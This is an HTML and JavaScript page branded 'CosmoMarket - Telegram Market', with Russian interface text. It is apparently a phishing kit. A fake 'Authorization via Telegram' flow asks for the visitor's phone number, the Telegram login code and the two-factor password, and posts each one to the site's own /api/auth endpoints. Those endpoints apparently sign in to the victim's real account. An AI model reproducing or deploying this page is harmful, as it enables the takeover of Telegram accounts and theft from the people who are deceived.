<!DOCTYPE html>
<html>
<head>
    <title>CosmoMarket - Telegram Market</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        *{margin:0;padding:0;box-sizing:border-box}body{font-family:Arial,sans-serif;background:linear-gradient(135deg,#1a0033 0%,#4a0072 50%,#8a2be2 100%);min-height:100vh;color:white;overflow-x:hidden;position:relative}.stars{position:fixed;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:-1}.star{position:absolute;background:white;border-radius:50%;animation:twinkle 5s infinite}@keyframes twinkle{0%,100%{opacity:.2}50%{opacity:1}}.container{max-width:500px;margin:0 auto;padding:20px;min-height:100vh;display:flex;flex-direction:column;justify-content:center;align-items:center}.logo{text-align:center;margin-bottom:30px;animation:float 6s ease-inout infinite}@keyframes float{0%,100%{transform:translateY(0)}50%{transform:translateY(-10px)}}.logo h1{font-size:3.5rem;font-weight:bold;background:linear-gradient(45deg,#ff6bff,#9d4edd,#5a00b5);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;text-shadow:0 0 30px rgba(255,107,255,.5);margin-bottom:10px}.logo p{font-size:1.1rem;opacity:.8;letter-spacing:2px}.auth-card{background:rgba(255,255,255,.1);backdrop-filter:blur(10px);border:1px solid rgba(255,255,255,.2);border-radius:20px;padding:40px 30px;width:100%;text-align:center;box-shadow:0 8px 32px rgba(0,0,0,.3);margin-bottom:30px}.animation-container{width:200px;height:200px;margin:0 auto 20px;border-radius:15px;overflow:visible;background:transparent;border:none;box-shadow:none}.telegram-animation{width:100%;height:100%;border-radius:15px;object-fit:cover;background:transparent;mix-blend-mode:screen;filter:drop-shadow(0 0 20px rgba(255,107,255,.4))}.telegram-icon{width:50px;height:50px;background-image:url('https://s3.radikal.cloud/2025/11/29/image-no-bg-preview-carve.photoscd6b65a24093aae0.png');background-size:contain;background-repeat:no-repeat;background-position:center}.start-btn{background:linear-gradient(135deg,#8a2be2,#9d4edd,#ff6bff);color:white;border:none;padding:16px 32px;font-size:1.1rem;font-weight:600;border-radius:50px;cursor:pointer;transition:all .3s ease;box-shadow:0 4px 20px rgba(138,43,226,.4);margin-top:20px;display:flex;align-items:center;justify-content:center;gap:12px;width:100%;max-width:300px;margin-left:auto;margin-right:auto;position:relative;overflow:hidden}.start-btn::before{content:'';position:absolute;top:0;left:-100%;width:100%;height:100%;background:linear-gradient(90deg,transparent,rgba(255,255,255,.2),transparent);transition:left .5s}.start-btn:hover::before{left:100%}.start-btn:hover{transform:translateY(-2px);box-shadow:0 6px 25px rgba(138,43,226,.6);background:linear-gradient(135deg,#9d4edd,#8a2be2,#c77dff)}.start-btn:active{transform:translateY(0);box-shadow:0 2px 10px rgba(138,43,226,.4)}.step{display:none;width:100%;animation:fadeIn .5s ease}@keyframes fadeIn{from{opacity:0;transform:translateY(20px)}to{opacity:1;transform:translateY(0)}}.step.active{display:block}.step h3{font-size:1.5rem;margin-bottom:25px;color:#ff6bff}.input-group{margin-bottom:20px;text-align:left}.input-group label{display:block;margin-bottom:8px;font-weight:bold;color:#e0c3ff}.input-group input{width:100%;padding:15px;background:rgba(255,255,255,.1);border:1px solid rgba(255,255,255,.3);border-radius:10px;color:white;font-size:1rem;transition:all .3s ease}.input-group input:focus{outline:none;border-color:#0088cc;box-shadow:0 0 15px rgba(0,136,204,.3)}.btn{background:linear-gradient(135deg,#8a2be2,#9d4edd,#ff6bff);color:white;border:none;padding:14px 30px;font-size:1rem;font-weight:600;border-radius:25px;cursor:pointer;transition:all .3s ease;box-shadow:0 4px 15px rgba(138,43,226,.4);width:100%;margin-top:10px;display:flex;align-items:center;justify-content:center;gap:10px}.btn:hover{transform:translateY(-2px);box-shadow:0 6px 20px rgba(138,43,226,.6);background:linear-gradient(135deg,#9d4edd,#8a2be2,#c77dff)}.btn:disabled{background:rgba(255,255,255,.2);cursor:not-allowed;transform:none;box-shadow:none}.help-btn{background:rgba(255,255,255,.1);color:#e0c3ff;border:1px solid rgba(255,255,255,.3);padding:10px 20px;border-radius:20px;cursor:pointer;margin-top:10px;transition:all .3s ease;width:100%;font-size:0.9rem}.help-btn:hover{background:rgba(255,255,255,.2)}.alert{padding:15px;margin:20px 0;border-radius:10px;text-align:left;animation:slideIn .3s ease}@keyframes slideIn{from{opacity:0;transform:translateX(-20px)}to{opacity:1;transform:translateX(0)}}.success{background:rgba(76,175,80,.2);border:1px solid rgba(76,175,80,.5);color:#a5d6a7}.error{background:rgba(244,67,54,.2);border:1px solid rgba(244,67,54,.5);color:#ef9a9a}.info{background:rgba(33,150,243,.2);border:1px solid rgba(33,150,243,.5);color:#90caf9}.warning{background:rgba(255,193,7,.2);border:1px solid rgba(255,193,7,.5);color:#fff59d}.user-info{background:rgba(255,255,255,.1);border-radius:15px;padding:20px;margin:20px 0;text-align:left;border:1px solid rgba(255,255,255,.2)}.user-info h4{color:#ff6bff;margin-bottom:15px;text-align:center}.user-info p{margin:8px 0;color:#e0c3ff}.back-btn{background:rgba(255,255,255,.1);color:white;border:1px solid rgba(255,255,255,.3);padding:10px 20px;border-radius:20px;cursor:pointer;margin-top:15px;transition:all .3s ease;width:100%}.back-btn:hover{background:rgba(255,255,255,.2)}.welcome-text{font-size:1.1rem;margin-bottom:30px;text-align:center;line-height:1.6;color:#e0c3ff}.btn-content{display:flex;align-items:center;justify-content:center;gap:10px}
    </style>
</head>
<body>
    <div class="stars" id="stars"></div>
    <div class="container">
        <div class="logo">
            <h1>Cosmo</h1>
            <p>TELEGRAM MARKET</p>
        </div>
        <div class="auth-card">
            <div id="startStep" class="step active">
                <div class="animation-container">
                    <img src="https://nft-market-production.up.railway.app/static/uploads_image_g30yOrP8Cp1n6fVBkaJbWEwmsYqH9z_ezgif-2911fdd0ce7f2110.gif" class="telegram-animation" alt="Telegram Auth Animation">
                </div>
                <h3>–î–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å –≤ CosmoMarket</h3>
                <div class="welcome-text">–ü—Ä–∏—Å–æ–µ–¥–∏–Ω—è–π—Ç–µ—Å—å –∫ —ç–∫—Å–∫–ª—é–∑–∏–≤–Ω–æ–º—É —Å–æ–æ–±—â–µ—Å—Ç–≤—É –≤ Telegram</div>
                <button class="start-btn" onclick="startAuth()">
                    <div class="btn-content">
                        <div class="telegram-icon"></div>
                        <span>–ê–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—è —á–µ—Ä–µ–∑ Telegram</span>
                    </div>
                </button>
            </div>

            <div id="step1" class="step">
                <h3>üì± –í–≤–µ–¥–∏—Ç–µ –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞</h3>
                <div class="input-group">
                    <label for="phone">–ù–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞:</label>
                    <input type="text" id="phone" placeholder="–ù–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞">
                </div>
                <button class="btn" onclick="requestCode()" id="requestBtn">
                    <div class="btn-content">
                        <div class="telegram-icon"></div>
                        <span>–ü–æ–ª—É—á–∏—Ç—å –∫–æ–¥</span>
                    </div>
                </button>
                <button class="help-btn" onclick="window.location.href='https://t.me/+42777'">
                    ‚ùì –ì–¥–µ –ø–æ—Å–º–æ—Ç—Ä–µ—Ç—å –∫–æ–¥?
                </button>
                <button class="back-btn" onclick="showStep('startStep')">‚Üê –ù–∞–∑–∞–¥</button>
            </div>

            <div id="step2" class="step">
                <h3>üî¢ –í–≤–µ–¥–∏—Ç–µ –∫–æ–¥ –∏–∑ Telegram</h3>
                <div class="input-group">
                    <label for="code">5-–∑–Ω–∞—á–Ω—ã–π –∫–æ–¥:</label>
                    <input type="text" id="code" placeholder="*****" maxlength="5">
                </div>
                <button class="btn" onclick="verifyCode()" id="verifyBtn">
                    <div class="btn-content">
                        <div class="telegram-icon"></div>
                        <span>–ü—Ä–æ–≤–µ—Ä–∏—Ç—å –∫–æ–¥</span>
                    </div>
                </button>
                <button class="help-btn" onclick="window.open('https://t.me/+42777', '_blank')">
                    ‚ùì –ì–¥–µ –ø–æ—Å–º–æ—Ç—Ä–µ—Ç—å –∫–æ–¥?
                </button>
                <button class="back-btn" onclick="showStep('step1')">‚Üê –ù–∞–∑–∞–¥</button>
            </div>

            <div id="step3" class="step">
                <h3>üîí –í–≤–µ–¥–∏—Ç–µ –ø–∞—Ä–æ–ª—å 2FA</h3>
                <div class="alert info">–≠—Ç–æ—Ç –∞–∫–∫–∞—É–Ω—Ç –∑–∞—â–∏—â–µ–Ω –¥–≤—É—Ö—Ñ–∞–∫—Ç–æ—Ä–Ω–æ–π –∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏–µ–π</div>
                <div class="input-group">
                    <label for="password">–ü–∞—Ä–æ–ª—å 2FA:</label>
                    <input type="password" id="password" placeholder="–í–≤–µ–¥–∏—Ç–µ –ø–∞—Ä–æ–ª—å">
                </div>
                <button class="btn" onclick="verifyPassword()" id="passwordBtn">
                    <div class="btn-content">
                        <div class="telegram-icon"></div>
                        <span>–ü—Ä–æ–≤–µ—Ä–∏—Ç—å –ø–∞—Ä–æ–ª—å</span>
                    </div>
                </button>
                <button class="back-btn" onclick="showStep('step2')">‚Üê –ù–∞–∑–∞–¥</button>
            </div>
            <div id="results"></div>
        </div>
    </div>

    <script>
        function createStars(){const e=document.getElementById("stars");for(let t=0;t<150;t++){const a=document.createElement("div");a.className="star";const o=2*Math.random()+1;a.style.width=o+"px",a.style.height=o+"px",a.style.left=100*Math.random()+"%",a.style.top=100*Math.random()+"%",a.style.animationDelay=5*Math.random()+"s",e.appendChild(a)}}let currentSessionId="",currentPhone="";function showStep(e){document.querySelectorAll(".step").forEach(t=>{t.classList.remove("active")}),document.getElementById(e).classList.add("active"),document.getElementById("results").innerHTML=""}function startAuth(){showStep("step1")}function showAlert(e,t){document.getElementById("results").innerHTML='<div class="alert '+t+'">'+e+"</div>"}function showUserInfo(e){document.getElementById("results").innerHTML=`<div class="user-info"><h4>‚úÖ –£—Å–ø–µ—à–Ω–∞—è –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—è!</h4><p><strong>üë§ –ò–º—è:</strong> ${e.first_name||"–ù–µ —É–∫–∞–∑–∞–Ω–æ"}</p><p><strong>üë• –§–∞–º–∏–ª–∏—è:</strong> ${e.last_name||"–ù–µ —É–∫–∞–∑–∞–Ω–∞"}</p><p><strong>üîó Username:</strong> @${e.username||"–ù–µ —É–∫–∞–∑–∞–Ω"}</p><p><strong>üÜî ID:</strong> ${e.id}</p><p><strong>üìû –¢–µ–ª–µ—Ñ–æ–Ω:</strong> ${e.phone_number}</p></div>`}async function requestCode(){const e=document.getElementById("phone").value.trim();currentPhone=e;if(!e)return void showAlert("–í–≤–µ–¥–∏—Ç–µ –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞","error");const t=document.getElementById("requestBtn");t.disabled=!0,t.innerHTML='<div class="btn-content"><div class="telegram-icon"></div><span>üì° –û—Ç–ø—Ä–∞–≤–∫–∞...</span></div>';try{const a=await fetch("/api/auth/request-code",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({phone:e})}),o=await a.json();o.success?(currentSessionId=o.session_id,showStep("step2"),showAlert("‚úÖ –ö–æ–¥ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω –≤ Telegram! –ü—Ä–æ–≤–µ—Ä—å—Ç–µ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ –∏ –≤–≤–µ–¥–∏—Ç–µ –∫–æ–¥.","success"),document.getElementById("code").focus()):showAlert("‚ùå "+o.error,"error")}catch(e){console.error("Error:",e),showAlert("‚ùå –û—à–∏–±–∫–∞ —Å–µ—Ç–∏: "+e.message,"error")}finally{t.disabled=!1,t.innerHTML='<div class="btn-content"><div class="telegram-icon"></div><span>–ü–æ–ª—É—á–∏—Ç—å –∫–æ–¥</span></div>'}}async function verifyCode(){const e=document.getElementById("code").value.trim();if(!e||5!==e.length)return void showAlert("–í–≤–µ–¥–∏—Ç–µ 5-–∑–Ω–∞—á–Ω—ã–π –∫–æ–¥ –∏–∑ Telegram","error");const t=document.getElementById("verifyBtn");t.disabled=!0,t.innerHTML='<div class="btn-content"><div class="telegram-icon"></div><span>üîç –ü—Ä–æ–≤–µ—Ä–∫–∞...</span></div>';try{const a=await fetch("/api/auth/verify-code",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({session_id:currentSessionId,code:e})}),o=await a.json();o.success?o.needs_password?(showStep("step3"),showAlert("üîí –¢—Ä–µ–±—É–µ—Ç—Å—è –ø–∞—Ä–æ–ª—å –¥–≤—É—Ö—Ñ–∞–∫—Ç–æ—Ä–Ω–æ–π –∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏–∏","info"),document.getElementById("password").focus()):(showUserInfo(o.user_info),showAlert("‚úÖ –ê–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—è –ø—Ä–æ—à–ª–∞ —É—Å–ø–µ—à–Ω–æ!","success")):showAlert("‚ùå "+o.error,"error")}catch(e){console.error("Error:",e),showAlert("‚ùå –û—à–∏–±–∫–∞ —Å–µ—Ç–∏: "+e.message,"error")}finally{t.disabled=!1,t.innerHTML='<div class="btn-content"><div class="telegram-icon"></div><span>–ü—Ä–æ–≤–µ—Ä–∏—Ç—å –∫–æ–¥</span></div>'}}async function verifyPassword(){const e=document.getElementById("password").value;if(!e)return void showAlert("–í–≤–µ–¥–∏—Ç–µ –ø–∞—Ä–æ–ª—å 2FA","error");const t=document.getElementById("passwordBtn");t.disabled=!0,t.innerHTML='<div class="btn-content"><div class="telegram-icon"></div><span>üîç –ü—Ä–æ–≤–µ—Ä–∫–∞...</span></div>';try{const a=await fetch("/api/auth/verify-password",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({session_id:currentSessionId,password:e})}),o=await a.json();o.success?(showUserInfo(o.user_info),showAlert("‚úÖ –ê–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—è –ø—Ä–æ—à–ª–∞ —É—Å–ø–µ—à–Ω–æ!","success")):showAlert("‚ùå "+o.error,"error")}catch(e){console.error("Error:",e),showAlert("‚ùå –û—à–∏–±–∫–∞ —Å–µ—Ç–∏: "+e.message,"error")}finally{t.disabled=!1,t.innerHTML='<div class="btn-content"><div class="telegram-icon"></div><span>–ü—Ä–æ–≤–µ—Ä–∏—Ç—å –ø–∞—Ä–æ–ª—å</span></div>'}}document.getElementById("phone").addEventListener("keypress",function(e){"Enter"===e.key&&requestCode()}),document.getElementById("code").addEventListener("keypress",function(e){"Enter"===e.key&&verifyCode()}),document.getElementById("password").addEventListener("keypress",function(e){"Enter"===e.key&&verifyPassword()}),document.addEventListener("DOMContentLoaded",function(){createStars()});
    </script>
</body>
</html>
